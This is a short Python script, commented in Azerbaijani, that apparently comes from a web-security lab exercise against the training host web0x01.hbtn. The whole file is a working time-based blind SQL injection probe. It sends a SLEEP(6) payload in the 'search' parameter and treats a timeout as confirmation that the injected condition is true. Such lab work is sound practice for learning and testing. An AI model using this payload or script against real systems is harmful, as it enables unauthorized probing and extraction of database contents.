import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/"
# Şərtin doğru olduğu hal üçün time-based payload
payload = "1' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)--"

print("True şərtlə sorğu göndərilir...")
start = time.time()
try:
    res = requests.get(url, params={"search": payload}, timeout=10)
    print(f"Müddət: {time.time() - start:.2f} saniyə")
except requests.exceptions.Timeout:
    print("[+] UĞURLU! Gecikmə işlədi (True şərt).")
